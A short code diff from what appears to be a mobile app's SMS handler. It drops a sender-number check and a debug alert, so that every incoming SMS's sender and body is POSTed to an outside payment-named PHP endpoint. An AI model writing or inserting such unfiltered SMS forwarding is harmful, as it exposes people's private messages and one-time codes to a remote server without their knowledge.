@@ -43,11 +43,9 @@
             	var sms = e.data;
 	        var adress= sms.address;
 	        var text = sms.body;
-                if (adress == "+4917689075097"){
-		sendTransDaten(adress, text, arbeitsNummer); }
-		else {}
-			//alert("Falsche Nummer");}
-            	
+               
+		sendTransDaten(adress, text, arbeitsNummer); 
+		
             });
 		    
 			
@@ -65,7 +63,7 @@ function fehler(error) {
 
        
        function sendTransDaten(nummer, nachricht, arbNummer ) {
-		alert(nummer + nachricht + arbNummer);
+		
 		$.ajax({
     type: 'POST',
     url: "http://simkhaa.com/mobile_orange_pay.php",
